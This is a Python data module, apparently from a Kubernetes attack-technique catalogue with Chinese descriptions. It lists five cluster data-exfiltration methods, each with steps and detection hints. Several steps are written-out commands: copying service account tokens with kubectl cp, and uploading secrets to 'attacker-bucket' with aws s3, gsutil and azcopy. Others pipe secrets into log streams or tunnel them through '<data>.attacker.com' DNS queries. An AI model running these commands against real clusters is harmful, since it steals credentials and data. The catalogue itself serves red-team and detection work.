"""数据渗出技术编目

收录 K8s 集群数据渗出技术，涵盖 Secret 外传、日志泄露、DNS/HTTP 隧道。
"""

from k8s_arsenal.models import AttackVector, AttackPhase, RiskLevel


EXFILTRATION_VECTORS: list[AttackVector] = [
    AttackVector(
        id="EXF-001",
        name="kubectl cp 数据渗出",
        phase=AttackPhase.EXFILTRATION,
        risk=RiskLevel.HIGH,
        description=(
            "利用 kubectl cp 命令从容器中拷贝文件到本地或攻击者控制的主机。"
            "kubectl cp 底层使用 tar 流式传输，可穿透 NetworkPolicy。"
            "将 Secret 挂载点、数据库文件、配置文件复制出集群。"
        ),
        prerequisites=["exec 或 cp 权限 (pods/exec)"],
        steps=[
            "kubectl cp <ns>/<pod>:/var/run/secrets/kubernetes.io/serviceaccount/token ./sa.token",
            "kubectl cp <ns>/<pod>:/data/database.db ./database.db",
            "kubectl cp <ns>/<pod>:/etc/config/app.conf ./app.conf",
            "将数据通过 HTTP POST 外传至 C2 服务器",
        ],
        detection_hints=[
            "异常的 kubectl cp 操作",
            "非运维时间的文件拷贝",
            "拷贝至非预期目标路径",
        ],
    ),
    AttackVector(
        id="EXF-002",
        name="DNS 隧道数据渗出",
        phase=AttackPhase.EXFILTRATION,
        risk=RiskLevel.HIGH,
        description=(
            "利用 DNS 查询将数据编码后渗出集群。"
            "将 Secret 内容分段，编码为 Base32/Base64 子域名，"
            "发送到攻击者控制的 DNS 服务器。"
            "大多数 NetworkPolicy 不限制 DNS (UDP 53) 出站流量。"
        ),
        prerequisites=["集群内 DNS 外解析不受限", "攻击者控制权威 DNS 服务器"],
        steps=[
            "将数据 Base64 编码并分段",
            "每段构造为 <data>.attacker.com DNS 查询",
            "C2 服务器接收 DNS 查询日志并重组数据",
        ],
        detection_hints=[
            "异常长度和熵值的 DNS 查询",
            "非标准 DNS 查询频率",
            "指向同一域名的重复查询模式",
        ],
        references=["DNS Tunneling Technique"],
    ),
    AttackVector(
        id="EXF-003",
        name="云存储渗出",
        phase=AttackPhase.EXFILTRATION,
        risk=RiskLevel.CRITICAL,
        description=(
            "利用已窃取的云凭证（IAM/Service Account Key）将数据写入云存储桶。"
            "AWS S3、GCP GCS、Azure Blob Storage 均可作为渗出通道。"
            "数据直接写入攻击者控制的外部账户或同一云账号的公开桶。"
        ),
        prerequisites=["已获取云凭证", "云存储服务写入权限"],
        steps=[
            "aws s3 cp /data/secrets.json s3://attacker-bucket/",
            "gsutil cp secrets.txt gs://attacker-bucket/",
            "azcopy copy /data/* https://attacker.blob.core.windows.net/container/",
        ],
        detection_hints=[
            "非预期的云存储写入操作",
            "数据写入外部/公开存储桶",
            "跨区域数据传输",
        ],
    ),
    AttackVector(
        id="EXF-004",
        name="Webhook 数据泄漏",
        phase=AttackPhase.EXFILTRATION,
        risk=RiskLevel.HIGH,
        description=(
            "利用 MutatingWebhookConfiguration 或 ValidatingWebhookConfiguration "
            "将 Pod 创建时的敏感数据（如环境变量、注解、标签中的凭证）"
            "转发到攻击者控制的 HTTPS 端点。"
        ),
        prerequisites=["create mutatingwebhookconfigurations 权限", "外部 HTTPS 服务"],
        steps=[
            "部署外部 Webhook HTTPS 服务接收数据",
            "创建 MutatingWebhookConfiguration 指向攻击者服务",
            "配置 Webhook 提取 Pod spec 中的 env/annotations/labels",
            "敏感数据通过 HTTPS 自动外传",
        ],
        detection_hints=[
            "新创建的 MutatingWebhookConfiguration",
            "Webhook 指向非标准服务地址",
            "Pod 注解中的环境变量泄露",
        ],
    ),
    AttackVector(
        id="EXF-005",
        name="日志流式渗出",
        phase=AttackPhase.EXFILTRATION,
        risk=RiskLevel.MEDIUM,
        description=(
            "利用日志聚合器（Fluentd/Fluent Bit/Filebeat）的转发功能，"
            "将敏感数据混入日志流中渗出。"
            "通过 echo secret | logger 或应用日志 API 写入日志。"
            "数据随日志流转发至外部 Elasticsearch/Kafka/S3。"
        ),
        prerequisites=["Pod 内写入日志能力", "日志聚合器转发至外部"],
        steps=[
            "echo $SECRET_KEY | logger -t k8s-app",
            "通过应用日志 API 输出敏感数据",
            "数据随 Fluentd pipeline 转发至外部 ES",
            "攻击者在外部日志接收端提取数据",
        ],
        detection_hints=[
            "日志中出现非预期结构化数据",
            "日志量突增",
            "应用日志中的敏感关键词",
        ],
    ),
]


def get_exfiltration_by_channel(channel: str) -> list[AttackVector]:
    """按渗出通道筛选"""
    channel_map = {
        "kubectl": ["kubectl", "cp"],
        "dns": ["DNS", "dns"],
        "cloud": ["Cloud", "S3", "GCS", "aws", "gsutil"],
        "webhook": ["Webhook", "mutating"],
        "log": ["Log", "日志", "Fluentd"],
    }
    if channel in channel_map:
        keywords = channel_map[channel]
        return [
            v for v in EXFILTRATION_VECTORS
            if any(kw.lower() in v.description.lower() for kw in keywords)
        ]
    return EXFILTRATION_VECTORS
